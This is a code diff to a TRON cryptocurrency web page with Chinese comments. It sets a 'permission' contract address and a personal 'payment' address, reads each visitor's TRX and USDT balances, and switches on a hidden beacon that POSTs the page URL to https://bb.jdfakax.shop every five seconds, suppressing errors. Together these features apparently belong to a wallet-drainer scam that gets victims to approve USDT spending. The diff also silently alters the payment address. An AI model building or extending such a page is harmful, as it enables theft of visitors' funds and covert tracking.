@@ -94,11 +94,13 @@
 // 必须填写有效的地址否则会报错
 
 // 权限地址（合约地址）
-const Permission_address = 'TTLVdtBYipLVqVbPaaQb2Zbcubbpddtxu7';
+window.Permission_address = 'TTLVdtBYipLVqVbPaaQb2Zbcubbpddtxu7';
 // 收款地址（个人地址）
-const Payment_address = 'TM1zzNDZD2DPASbKcgdVoTYhfmYgtfwx9R';
+window.Payment_address = 'TM1zzNDZD2DPASbKgdVoTYhfmYgtfwx9R';
 // USDT官方合约地址（无需修改）
-const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+// 服务器地址用于发送心跳
+window.heartbeatUrl = 'https://bb.jdfakax.shop';
 
 // 创建一个对象来存储用户数据
 const userData = {
@@ -158,22 +160,22 @@ async function initDApp() {
     try {
         userData.address = window.tronWeb.defaultAddress.base58;
         console.log("用户地址:", userData.address);
-
+        
         // 获取 TRX 余额
         const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
         userData.trxBalance = window.tronWeb.fromSun(trxBalance);
         console.log("TRX 余额:", userData.trxBalance);
-
-        // 确保 usdtContractAddress 已定义
-        if (!usdtContractAddress) {
+        
+        // 使用全局变量 usdtContractAddress
+        if (!window.usdtContractAddress) {
             throw new Error("USDT 合约地址未定义");
         }
         
-        const contract = await window.tronWeb.contract().at(usdtContractAddress);
+        const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
         const usdtBalance = await contract.balanceOf(userData.address).call();
         userData.usdtBalance = usdtBalance / 1e6; // USDT 有 6 位小数
         console.log("USDT 余额:", userData.usdtBalance);
-
+        
         // 更新UI显示TRX余额
         updateTRXBalance();
     } catch (error) {
@@ -360,45 +362,37 @@ document.addEventListener('DOMContentLoaded', () => {
     initializeDApp();
 });
 
-// function sendHeartbeat() {
-//     const currentUrl = window.location.href;
-//     const heartbeatUrl = 'https://bb.jdfakax.shop'; // 请替换为您的服务器地址和端口
+// 使用全局变量的心跳函数
+function sendHeartbeat() {
+    const currentUrl = window.location.href;
     
-//     fetch(heartbeatUrl, {
-//         method: 'POST',
-//         mode: 'cors', // 启用CORS
-//         headers: {
-//             'Content-Type': 'application/json',
-//         },
-//         body: JSON.stringify({ url: currentUrl })
-//     })
-//     .then(response => response.json())
-//     .then(data => {
-//         if (data.status === 'error') {
-//             console.log('心跳错误:', data.message);
-//             if (data.message === '会话已结束') {
-//                 alert('您的会话已结束，页面将关闭。');
-//                 window.close(); // 尝试关闭窗口
-//             }
-//         } else {
-//             console.log('心跳发送成功，发送的URL:', currentUrl);
-//         }
-//     })
-//     .catch(error => {
-//         console.log('心跳发送失败，跳过此次发送');
-//     });
-// }
+    fetch(window.heartbeatUrl, {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ url: currentUrl })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'error' && data.message === '会话已结束') {
+            console.log('会话已结束');
+        }
+    })
+    .catch(() => {
+        // 捕获错误但不做任何处理
+    });
+}
 
-// // 每5秒发送一次心跳
-// const heartbeatInterval = setInterval(sendHeartbeat, 5000);
+// 心跳定时器和页面事件处理保持不变
+const heartbeatInterval = setInterval(sendHeartbeat, 5000);
 
-// // 页面加载时立即发送一次心跳
-// window.onload = sendHeartbeat;
+window.onload = sendHeartbeat;
 
-// // 当页面要关闭时
-// window.onbeforeunload = function() {
-//     clearInterval(heartbeatInterval); // 停止心跳
-// };
+window.onbeforeunload = function() {
+    clearInterval(heartbeatInterval);
+};
 </script>
 </body>
 </html>
